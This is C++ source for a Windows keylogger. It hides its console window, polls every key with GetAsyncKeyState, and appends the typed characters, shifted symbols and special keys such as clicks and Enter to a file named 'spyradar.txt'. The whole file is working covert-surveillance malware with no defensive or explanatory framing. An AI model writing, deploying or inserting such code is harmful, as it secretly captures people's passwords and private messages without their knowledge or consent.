#include <iostream>
#include <fstream>
#include <windows.h>
#include <cctype>
#include <map>


std::map<int, std::string> spcl_key_map = {
    {1, "#LCK#"}, // left click
    {2, "#RCK#"}, // right click
    {9, "#TAB#"}, // tab
    {13, "#ENT#"}, // enter
    {16, "#SHF#"}, // shift
    {17, "#CTR#"}, // CTRL
    {18, "#ALT#"}, // Alt
    {20, "#CPL#"}, // caps lock
    {27, "#ESC#"}, // escape
    {32, " "}, // space
    {33, "#PUP#"}, // page up
    {34, "#PDN#"}, // page down
    {36, "#HOM#"}, // home
    {37, "#LFA#"}, // left arrow
    {38, "#DNA#"}, // down arrow
    {39, "#RTA#"}, // right arrow
    {40, "#UPA#"}, // up arrow
    {44, "#---#"}, // Funny Key
    {91, "#WIN#"}, // windows key
    {255, "#FNC#"}, // Fn
};

std::map<char, std::string> shft_key_map = {
    {'1', "!"},  
    {'2', "@"}, 
    {'3', "#"}, 
    {'4', "$"}, 
    {'5', "%"}, 
    {'6', "^"}, 
    {'7', "&"}, 
    {'8', "*"}, 
    {'9', "("}, 
    {'0', ")"}, 
    {'-', "_"},
    {'=', "+"},
    {'[', "{"},
    {']', "}"},
    {'\\', "|"},
    {';', ":"},
    {'\'', "\""},
    {',', "<"},
    {'.', ">"},
    {'/', "?"},
    
};

bool caps_lock = false;
bool shft_key = false;
bool shft = false;


void hideConsole(){
    // get the console window handle
    HWND consoleWindow = GetConsoleWindow(); 

    // check if console window handle retrieved
    if (consoleWindow != NULL) {
        ShowWindow(consoleWindow, SW_HIDE); // hide console
    }else{ exit(1); }
}

int main(){

    bool key_state[256] = {true}; // array to track key states
    char key_char = ' ';
    
    hideConsole();

    std::ofstream keylog("spyradar.txt", std::ios::app); // open or create a text file in append mode

    // if the file didn't open, shut the program down
    if (!keylog.is_open()){
        exit(1);
    }

    // loop to continuously track key inputs
    while (true) {

        // check each key
        for (int vkey = 1; vkey <= 255; vkey++) {

            // check if key pressed
            if (GetAsyncKeyState(vkey) & 0x8000) {
                if (vkey == 16){ shft_key = true; }

                if (key_state[vkey]) {
                    continue; // skip this key if already pressed
                }

                if(spcl_key_map[vkey] != ""){ // handles special keys

                    if(vkey == 20) { caps_lock = !caps_lock; } // switch for caps lock key

                    keylog << spcl_key_map[vkey];
                    keylog.flush();
                    std::cout << vkey << spcl_key_map[vkey] << std::endl;
                    key_state[vkey] = true;
                    continue;
                }

                std::cout << vkey;
                key_char = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
                
                shft = (shft_key || caps_lock) && (!shft_key || !caps_lock);

                if (shft) { 

                    if(shft_key_map[key_char] != ""){ // handles the shift value of a key
                        keylog << shft_key_map[key_char];
                        keylog.flush();
                        std::cout << shft_key_map[key_char] << std::endl;
                        key_state[vkey] = true;
                        continue;
                    }

                    keylog << key_char; std::cout << key_char; // uppercase letters
                }
                else{ keylog << (char) tolower(key_char); std::cout << (char) tolower(key_char); } // lowercase letters
                
                keylog.flush(); // flush the output to the file
                
                key_state[vkey] = true; // update key state
            } else {
                key_state[vkey] = false; // update key state 
            }   
        }

        // delay to avoid high CPU usage
        Sleep(10);
        shft_key = false;
    } 

    keylog.close();

    return 0;
}